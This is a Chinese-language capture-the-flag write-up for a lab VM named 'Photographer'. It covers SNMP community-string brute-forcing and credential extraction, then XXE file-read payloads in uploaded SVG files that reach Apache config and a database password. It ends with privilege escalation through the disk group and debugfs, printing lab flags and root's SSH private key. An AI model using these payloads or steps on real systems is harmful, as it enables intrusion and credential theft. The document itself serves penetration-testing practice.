# 1. 信息收集

## 1.1. 端口扫描

web质量还可以

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l     
...
192.168.205.132 08:00:27:fc:e2:47       PCS Systemtechnik GmbH
...
```

192.168.205.132 

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132          
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

## 1.2. Web服务探测

是一个摄影师的博客，他叫**Ethan**，没有找到其他有价值的信息

## 1.3. 漏洞扫描

这里因为Wappalyzer误导了一下，我以为这个是wordpress（误报），所以我进行了nuclei web漏洞扫描（纯纯机缘巧合）

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u 192.168.205.132     

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

                projectdiscovery.io
...
[external-service-interaction] [http] [info] http://192.168.205.132
[external-service-interaction] [http] [info] http://192.168.205.132
[waf-detect:apachegeneric] [http] [info] http://192.168.205.132
[ssh-auth-methods] [javascript] [info] 192.168.205.132:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] 192.168.205.132:22
[ssh-server-enumeration] [javascript] [info] 192.168.205.132:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7"]
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.132:22
[openssh-detect] [tcp] [info] 192.168.205.132:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7"]
[apache-detect] [http] [info] http://192.168.205.132 ["Apache/2.4.65 (Debian)"]
[snmpv1-community-detect-string] [javascript] [high] 192.168.205.132:161 ["photographer"] [community_string="public"]
[snmpv3-detect] [javascript] [info] 192.168.205.132:161 ["net-snmp, Engine ID: 1f88805368bc4066c2f66800000000"]
[options-method] [http] [info] http://192.168.205.132 ["GET,POST,OPTIONS,HEAD"]
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.132
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.132
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.132
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.132
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.132
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.132
[INF] Scan completed in 1m. 23 matches found.
```

snmp找出了一个默认社区字符串`public`，snmp的默认端口是udp的161

# 2. SNMP服务利用

*ps:没接触过snmp的看这:[161,162,10161,10162/udp - Pentesting SNMP](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html)*

常规利用一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ snmpwalk -v 2c -c public 192.168.205.132                                       
...
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
...
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.1.0-40-amd64 root=UUID=77e51563-68a2-4cef-9d02-2b434abfe0dd ro quiet
"
...
```

这个长度不像是正常的snmp输出，应该还有其它的社区字符串，爆破一手

## 2.1. 社区字符串爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.205.132
Scanning 1 hosts, 120 communities
192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
192.168.205.132 [security] Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
```

还存在一个`security`

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ snmpwalk -v 2c -c security 192.168.205.132 |wc -l
3666
```

这个长度非常的正确，但是我没扒拉到有价值的，snmp还有一个扩展查询可以查看

## 2.2. 扩展查询获取凭证

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ snmpwalk -v 2c -c security 192.168.205.132 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."mycreds" = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
```

`ethan:1N3qVgwNB6cZmNSyr8iX$!`

给了我们一串凭证，经过测试ssh直接连接无效，白日梦破碎

那就是web了，目录爆破

# 3. Web目录爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u http://192.168.205.132       
...
[23:05:54] 200 -    1KB - http://192.168.205.132/about.html
[23:05:54] 301 -  318B  - http://192.168.205.132/admin  ->  http://192.168.205.132/admin/
[23:05:54] 200 -  536B  - http://192.168.205.132/admin/
[23:05:54] 302 -    1KB - http://192.168.205.132/admin/admin.php  ->  index.php
[23:05:54] 200 -  536B  - http://192.168.205.132/admin/index.php
[23:05:54] 500 -    0B  - http://192.168.205.132/admin/upload.php
[23:05:56] 301 -  319B  - http://192.168.205.132/assets  ->  http://192.168.205.132/assets/
[23:05:56] 200 -  476B  - http://192.168.205.132/assets/
[23:05:59] 301 -  319B  - http://192.168.205.132/images  ->  http://192.168.205.132/images/
[23:05:59] 200 -  529B  - http://192.168.205.132/images/
[23:06:02] 403 -  280B  - http://192.168.205.132/server-status/
[23:06:02] 403 -  280B  - http://192.168.205.132/server-status
```

有个admin管理登录页，有uploads上传页，目前推测通过上传拿shell

使用凭证进行登录

# 4. XXE漏洞利用

果然是上传利用，通过测试和看前端的源码，发现只可以上传`.jpg,.png,.gif,.jpeg`（存疑），并且貌似是启用了**MIME Type检测**

## 4.1. SVG文件上传测试

经过短暂的测试，大部分常规利用都无法利用，但是在上传svg的时候（我制作了一个包含php利用的svg）有明显的处理的痕迹，他处理svg文件的时间非常久，这在我们本地靶机的情况下是很少见的，SVG 作为一种基于 XML 的格式，很有可能可以用来利用XXE

*参考资料:[SVG - 文件上传](https://book.hacktricks.wiki/zh/pentesting-web/xxe-xee-xml-external-entity.html?highlight=svg#svg---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)*

## 4.2. 文件读取

先尝试利用文件读取（hacktricks的攻击示例写的好像有点问题，它利用了image标签，不是很理解，我们自己改一下）

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

成功回显，发现存在**ethan**用户，读取ssh私钥无果

试试命令执行

*ps:expect包装器通常不开，试试吧，不吃亏*

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

没有显示无法利用

## 4.3. Apache配置文件读取

这里想读一下`/admin/index.php`的源码，但是默认路径`/var/www/html`不对，没有回显，扒拉一下路径

已知是apache的服务，看看配置文件

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

然后就炸了......状态码500

应该是文本太多的问题，试试`php_filter`链（想直接执行命令的有点难度，太长了，它会解析到）

````xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf" > ]>
<svg width="500px" height="2000px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="10" x="0" y="20">&xxe;</text>
</svg>
````

拿到了一个大概的位置`sites-enabled/*.conf`，但是默认的`000-default.conf`返回是空的，所以直接爆破一手

拿`directory-list-2.3-medium.txt`爆破的

应该是速度太快跑蒙了，他显示`web、library、wik`i的长度都为641，结果查看是同一base64

解出来

```php
<VirtualHost *:80>
    ServerName photographer.thl
    DocumentRoot /var/www/blog

    ErrorLog ${APACHE_LOG_DIR}/photographer_error.log
    CustomLog ${APACHE_LOG_DIR}/photographer_access.log combined
</VirtualHost>

```

look look

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/blog/admin/index.php" > ]>
<svg width="500px" height="2000px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="10" x="0" y="20">&xxe;</text>
</svg>
```

看了一下，数据库密码在db.php，我们看一下数据库密码，看他有没有密码复用

## 4.4. 数据库凭证获取

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/blog/admin/db.php" > ]>
<svg width="500px" height="2000px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="10" x="0" y="20">&xxe;</text>
</svg>
```

解出

```php
<?php
$host = "localhost";
$db = "blog";
$user = "root";
$pass = "pjtF0533OPiSMQTGZacZY6jy$";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
```

# 5. SSH登录与权限提升

## 5.1. 密码复用测试

测试一下                 *做一下白日梦:)*

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.132                                                          
root@192.168.205.132's password: 
Permission denied, please try again.
root@192.168.205.132's password: 
  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh ethan@192.168.205.132
ethan@192.168.205.132's password: 
Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer

Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
ethan@photographer:~$ id
uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
```

一眼丁真，`6(disk)`可以直接读东西

## 5.2. disk组权限利用

```bash
ethan@photographer:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
udev             965M      0  965M   0% /dev
tmpfs            197M   552K  197M   1% /run
/dev/sda1         19G   2,6G   16G  15% /
tmpfs            984M      0  984M   0% /dev/shm
tmpfs            5,0M      0  5,0M   0% /run/lock
tmpfs            197M      0  197M   0% /run/user/1001
ethan@photographer:~$ debugfs /dev/sda1
-bash: debugfs: orden no encontrada
ethan@photographer:~$ which debugfs
ethan@photographer:~$ find / -name 'debugfs' 2>/dev/null
/usr/sbin/debugfs
```

## 5.3. Flag获取

```bash
debugfs:  cat /root/root.txt
dc54639c5bd88637cc23dd7dd1827bbf
debugfs:  cat /home/ethan/user.txt
3fd75fcad59cce5c0bbb0f1a52b04ebd
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
wyij4+RkfxUm0AAAALcm9vdEBkZWJpYW4=
-----END OPENSSH PRIVATE KEY-----
```